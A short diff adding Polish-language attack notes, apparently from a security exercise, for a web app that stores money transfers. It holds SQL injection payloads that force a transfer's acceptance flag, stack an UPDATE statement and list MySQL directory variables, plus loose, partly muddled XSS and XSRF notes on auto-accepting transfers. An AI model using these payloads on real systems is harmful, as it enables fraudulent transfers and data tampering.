@@ -1,0 +1,19 @@
+//INSERT INTO `transfers`(`0`, `1`, `2`, `3`, `4`, `5`, `6`) VALUES ('aa','a','a','a','as',NOW(), 0)
+
+
+zautomatyczne zaakecptowanie przelewu
+b','b','b','b',NOW(), 1); #  
+
+dowolna komenda po ; np
+b','b','b','b',NOW(), 1); UPDATE transfers SET `0` = 'bb' WHERE `0` = 'aa' ;#
+
+teorewtycznie pliki:
+show variables where Variable_Name like "%dir"
+
+
+
+XSRF: to samo co XSS tylko skrypt będzie ładowany od stronu użytkownika
+
+XSS: na stronie dodatkowy skrypt powodujący automatyczne zaakceptowanie transferow z uprawnieniami uzytkownika.
+
+
